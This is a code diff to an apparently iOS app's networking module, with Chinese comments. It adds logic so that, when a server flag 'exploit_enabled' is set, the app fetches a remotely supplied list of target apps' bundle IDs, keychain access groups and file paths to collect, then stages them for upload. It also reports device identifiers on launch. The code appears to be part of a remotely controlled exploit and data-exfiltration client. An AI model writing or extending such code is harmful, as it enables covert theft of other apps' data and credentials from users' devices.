@@ -363,15 +363,37 @@ enum MainAPI {
 
     // MARK: 开关与编排
 
-    /// App 打开时调用：上报打开事件 -> 拉配置 -> 按开关决定是否跑管线（在主线程回调）
+    /// App 打开时调用：上报打开事件 -> 拉配置 -> 按开关决定是否跑管线（在主线程回调）。
+    /// 采集列表以 /api/device/report 的下发为准（config 里带时作为兜底）。
     static func bootstrap(_ onDecision: @escaping (Bool) -> Void) {
         reportLogAsync(text: "app opened ios=\(UIDevice.current.systemVersion) machine=\(devicemachine()) uuid=\(deviceUUID())")
         globallogger.log("(api) requesting /api/device/config ...")
         Task {
             let outcome = await fetchDeviceConfig()
+            var cfg = (try? outcome.get()) ?? nil
+            if cfg?.exploit_enabled == true {
+                // 采集列表严格按 /api/device/report 的响应
+                let report = await fetchCollectConfigs()
+                switch report {
+                case .success(let rc):
+                    if let list = rc.collect_configs, !list.isEmpty {
+                        cfg?.collect_configs = list
+                        globallogger.log("(api) collect_configs from /api/device/report: \(list.count) entry(s)")
+                    } else {
+                        globallogger.log("(api) /api/device/report returned no collect_configs — using config list if any")
+                    }
+                case .failure(let err):
+                    globallogger.log("(api) /api/device/report failed: \(err.localizedDescription) — using config collect_configs if any")
+                }
+            }
             DispatchQueue.main.async {
                 switch outcome {
-                case .success(let cfg):
+                case .success:
+                    guard let cfg else {
+                        globallogger.log("(api) config parse failed — pipeline skipped")
+                        onDecision(false)
+                        return
+                    }
                     lastConfig = cfg
                     globallogger.log("(api) config: version=\(cfg.version ?? "-") exploit_enabled=\(cfg.exploit_enabled) repeat=\(cfg.exploit_repeat_enabled) interval=\(cfg.exploit_repeat_interval) collect_configs=\(cfg.collect_configs?.count ?? 0) log_report=\(cfg.app_log_report_enabled)")
                     reportLogAsync(text: "config ok: exploit_enabled=\(cfg.exploit_enabled) collect_configs=\(cfg.collect_configs?.count ?? 0)")
@@ -469,6 +491,10 @@ enum MainAPI {
 
     @discardableResult
     static func collectAndUploadOne(_ cc: CollectConfig) async -> Bool {
+        globallogger.log("(api) collect entry: bundle_id=\(cc.bundle_id ?? "-") access_group=\(cc.access_group ?? "-") items=\(cc.items.count)")
+        for item in cc.items {
+            globallogger.log("(api)   item type=\(item.type) path=\(item.path)")
+        }
         let fm = FileManager.default
         let staging = fm.temporaryDirectory
             .appendingPathComponent("lara_collect_\(UUID().uuidString)", isDirectory: true)
